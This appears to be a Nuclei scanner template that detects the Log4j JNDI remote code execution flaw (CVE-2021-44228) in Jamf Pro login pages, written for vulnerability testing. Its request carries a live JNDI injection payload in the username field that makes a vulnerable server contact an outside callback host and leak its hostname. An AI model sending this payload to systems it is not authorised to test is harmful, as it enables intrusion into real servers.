id: jamf-log4j-jndi-rce
info:
  name: JamF (Log4j) - Remote Code Execution
  author: pdteam
  severity: critical
  description: JamF software is vulnerable to remote code execution via the Apache
    log4j library, allowing attackers to execute arbitrary code loaded from LDAP servers
    when message lookup substitution is enabled.
  reference:
  - https://github.com/random-robbie/jamf-log4j
  - https://community.connection.com/what-is-jamf/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: http.html:"JamF"
    verified: 'true'
    impact: The JamF (Log4j) vulnerability's impact includes the potential for remote
      code execution through attacker-controlled LDAP and JNDI endpoints.
    recommendation: It is recommended that JamF users update to log4j version 2.16.0
      or higher to protect against remote code execution via JNDI endpoints.
  tags: cve,cve2021,rce,jndi,log4j,jamf,oast,kev
requests:
- raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Referer: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded


    username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&password=

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - <title>Jamf Pro Login</title>
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
